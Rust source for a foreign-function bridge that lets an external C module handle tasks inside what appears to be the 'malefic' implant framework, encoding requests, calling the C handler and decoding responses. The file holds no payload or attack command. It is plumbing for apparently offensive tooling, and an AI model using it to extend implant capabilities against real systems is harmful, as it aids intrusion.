use malefic_3rd_ffi::*;
use std::ffi::{c_char, c_int, c_uint};

extern "C" {
    fn CModuleName() -> *const c_char;
    fn CModuleHandle(
        task_id: c_uint,
        req_data: *const c_char,
        req_len: c_int,
        resp_data: *mut *mut c_char,
        resp_len: *mut c_int,
    ) -> c_int;
}

pub struct CModule {
    name: String,
}

impl CModule {
    fn init() -> Self {
        let name = unsafe { ffi_module_name(CModuleName, false) };
        Self { name }
    }
}

#[async_trait]
impl Module for CModule {
    fn name() -> &'static str
    where
        Self: Sized,
    {
        "c_module"
    }

    fn new() -> Self
    where
        Self: Sized,
    {
        CModule::init()
    }

    fn new_instance(&self) -> Box<MaleficModule> {
        Box::new(CModule {
            name: self.name.clone(),
        })
    }
}

#[async_trait]
impl ModuleImpl for CModule {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut Input,
        _sender: &mut Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;
        let req_buf = encode_request(&request)?;

        let mut resp_ptr: *mut c_char = std::ptr::null_mut();
        let mut resp_len: c_int = 0;

        let rc = unsafe {
            CModuleHandle(
                id as c_uint,
                req_buf.as_ptr() as *const c_char,
                req_buf.len() as c_int,
                &mut resp_ptr,
                &mut resp_len,
            )
        };

        if rc != 0 {
            return Err(anyhow!("CModuleHandle failed (task {}, rc={})", id, rc).into());
        }

        let response = if !resp_ptr.is_null() && resp_len > 0 {
            let buf = unsafe { FfiBuffer::new(resp_ptr, resp_len as usize) };
            decode_response(buf.as_bytes())?
        } else {
            if !resp_ptr.is_null() {
                unsafe { ffi_free(resp_ptr) };
            }
            Response::default()
        };

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}

pub fn register(map: &mut MaleficBundle) {
    let module = CModule::init();
    map.insert(module.name.clone(), Box::new(module));
}
